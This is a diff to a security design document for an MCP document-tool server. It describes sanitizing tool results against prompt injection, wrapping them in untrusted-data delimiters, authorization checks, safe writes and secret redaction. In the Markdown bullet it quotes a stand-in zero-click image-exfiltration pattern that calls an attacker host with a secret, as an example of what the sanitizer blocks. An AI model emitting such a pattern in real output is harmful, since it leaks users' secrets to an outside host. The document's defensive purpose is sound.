@@ -88,6 +88,69 @@ top risk.
   `tools/list` and cannot call it. Protected-resource metadata is published at
   `/.well-known/oauth-protected-resource/mcp` per RFC 9728.
 
+## Document tools: content, authorization, and mutation
+
+The document suite (`doc_search`, `doc_read`, `doc_retrieve`, `doc_scan`,
+`doc_write`) operates over a jailed corpus of JSON, Markdown, and text files
+and adds three mitigations beyond the ones above.
+
+**Untrusted content boundary** (`content/`). A tool result flows back into a
+model's context, where prose could read as instructions. Every returned
+document is sanitized for its format and wrapped in provenance:
+
+- JSON (`content/json_safe.py`) is parsed with size, pre-parse nesting-depth,
+  element-count, and duplicate-key bounds, rejects non-standard NaN/Infinity,
+  and is re-serialized canonically. Python's parser never instantiates
+  arbitrary types, so CWE-502 gadget chains do not apply.
+- Markdown (`content/markdown_safe.py`) has raw HTML stripped, image URLs
+  dropped (killing zero-click `![](attacker/?secret=…)` exfiltration), links
+  restricted to http/https, and `javascript:`/`data:`/`file:` scheme URIs
+  neutralized.
+- Text (`content/text_safe.py`) has ANSI escapes, control characters, and
+  zero-width/bidi characters stripped, a UTF-7 byte-order mark refused, and is
+  always decoded as UTF-8 and NFC-normalized.
+- Every return is wrapped (`content/provenance.py`) in randomized per-response
+  delimiters plus structured metadata and an untrusted-data notice.
+
+**Scope is necessary but not sufficient** (`authz/`). The MCP guidance names
+treating the token scope as sufficient an anti-pattern, so each document call
+passes a per-resource authorization check after its scope check. Scopes are
+split by verb (`docs:search/read/scan/write`); the default policy grants
+corpus-wide search/read/scan but confines writes to the caller's own
+`<subject>/` namespace, so cross-subject writes are denied. The `Authorizer`
+protocol is the seam for an external policy engine (OPA, Cedar). A denial is
+audited distinctly (error type `AuthorizationError`) and never echoes the
+resource.
+
+**Write-path safety** (`store/document_store.py`, `doc_write`). Writes are
+jailed after full path canonicalization (symlink escapes refused), atomic
+(temp file, fsync, move into place, so no partial document is ever read), and
+no-clobber by default via a race-free hard link. Per-document size and total
+corpus quota caps apply. Overwriting is destructive: it requires an explicit
+flag and, when the client supports it, human confirmation via elicitation
+bound to the token subject; an explicit decline blocks the write.
+
+**Secret and PII redaction** (`security/secret_scan.py`). `doc_scan` reports a
+type, a location, and a redacted placeholder `[REDACTED:TYPE:tag]` whose tag is
+a short non-reversible hash. The raw value is never returned or logged; an
+adversarial test asserts this for each secret type.
+
+**Search denial-of-service** (`security/search_match.py`). Search is literal by
+default. Regex is opt-in and disabled by default, and when enabled runs through
+a ReDoS-resistant engine with a hard per-match timeout, applied per line.
+Results, files scanned, and aggregate bytes are all bounded.
+
+### A note on scope enforcement
+
+Per the MCP spec, an under-scoped call SHOULD receive a `403` with a
+`WWW-Authenticate: insufficient_scope` step-up challenge. Arrowhead instead
+hides a tool the caller lacks the scope for (it is filtered from `tools/list`
+and reported as unknown on call). This is a deliberate choice: revealing that a
+tool exists and which scope it needs leaks the tool surface and scope taxonomy
+to an under-privileged caller. The MUST-level discovery path (401 with
+`WWW-Authenticate` and `resource_metadata` on a missing or invalid token) is
+still served.
+
 ## Abuse controls and observability
 
 - **Rate limiting** (`security/rate_limit.py`): per-caller, per-tool token
